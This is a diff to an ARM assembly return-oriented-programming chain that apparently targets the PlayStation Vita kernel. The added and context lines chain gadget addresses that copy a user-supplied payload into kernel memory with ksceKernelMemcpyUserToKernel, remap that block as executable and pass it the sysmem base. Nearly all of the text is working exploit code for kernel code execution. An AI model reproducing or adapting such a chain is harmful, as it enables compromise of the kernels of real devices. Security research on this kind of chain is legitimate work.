@@ -59,7 +59,10 @@ copy_from_user_to_kernel:
   .word      0xDEADBEEF @ r0 = dummy
   .word    PAYLOAD_ADDR @ r1 = PAYLOAD_ADDR
   .word    PAYLOAD_SIZE @ r2 = PAYLOAD_SIZE
+  .word BASE+0x00000347 @ r3 = pop {pc}
   .word      0xDEADBEEF @ r4 = dummy
+  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
+  .word BASE+0x00006289 @ ksceKernelMemcpyUserToKernel(r0 = payload_code_block, r1 = PAYLOAD_ADDR, r2 = PAYLOAD_SIZE); ?pop {r3, r4, r5, pc}?
 
 mark_executable:
   .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
@@ -69,7 +72,7 @@ mark_executable:
   .word BASE+0x0000af33 @ ksceKernelFindMemBlockByAddr(r0 = payload_code_block, r1 = 0); pop {r3, r4, r5, pc}
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word      0xDEADBEEF @ r4 = dummy
-  .word  SECOND_PAYLOAD @ r5 = dummy
+  .word  SECOND_PAYLOAD @ r5 = second payload userland address (arg1 to payload)
   .word BASE+0x0001fc6d @ blx r3 @ pop {r4, pc}
   .word BASE+0x0000ea73 @ movs r3, r0 @ bx lr
   .word      0xDEADBEEF @ r4 = dummy
@@ -83,7 +86,7 @@ mark_executable:
   .word BASE+0x000150a3 @ mov r0, r3 @ pop {r3, pc}
   .word      0xDEADBEEF @ r3 = dummy
   .word BASE+0x0000a74d @ ksceKernelRemapBlock(r0 = payload_code_blockid, r1 = 0x1020D005) @ bx lr
-  .word BASE            @ r4 = sysmem base (arg to payload)
+  .word BASE            @ r4 = sysmem base (arg0 to payload)
 
 clean_dcache:
   .word BASE+0x00000853 @ pop {r0, r1, pc}
